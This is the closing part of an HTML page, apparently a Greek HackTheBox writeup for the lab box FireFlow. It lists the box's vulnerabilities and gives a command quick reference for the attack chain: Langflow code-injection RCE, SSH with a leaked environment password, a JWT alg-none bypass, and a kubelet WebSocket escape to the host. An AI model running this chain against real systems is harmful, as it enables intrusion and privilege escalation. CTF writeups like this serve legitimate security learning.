+    <tr><td>nightfall</td><td>Credentials SSH σε plaintext μεταβλητές environment (CWE-798)</td></tr>
+    <tr><td>root</td><td>Η υπηρεσία MCP δέχεται JWT με <code>alg: none</code>, παρακάμπτοντας authentication· το service account έχει RBAC <code>nodes/proxy</code>· το pod node-exporter κάνει mount το filesystem του host μέσω <code>hostPath</code> (CWE-269 privilege delegation)</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># Recon</span>
+<span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt;</span>
+<span class="pc">curl -s https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636... | jq .</span>
+
+<span class="pco"># Foothold — Langflow RCE μέσω component code injection (:443)</span>
+<span class="pc">python3 langflow_rce.py    # POST /api/v1/build_public_tmp/{flow_id}/flow</span>
+
+<span class="pco"># Πλάγια κίνηση — SSH ως nightfall</span>
+<span class="pc">ssh nightfall@&lt;TARGET_IP&gt;  # password from $LANGFLOW_SUPERUSER_PASSWORD</span>
+
+<span class="pco"># Privilege escalation — MCP JWT none-algorithm bypass (:30080)</span>
+<span class="pc">python3 jwt_none_exploit.py # Create JWT with alg=none, register MCP tools</span>
+
+<span class="pco"># Kubernetes escape — kubelet WebSocket exec (:10250)</span>
+<span class="pc">python3 kubelet_escape.py    # WSS to node-exporter pod → /host/root/root.txt</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
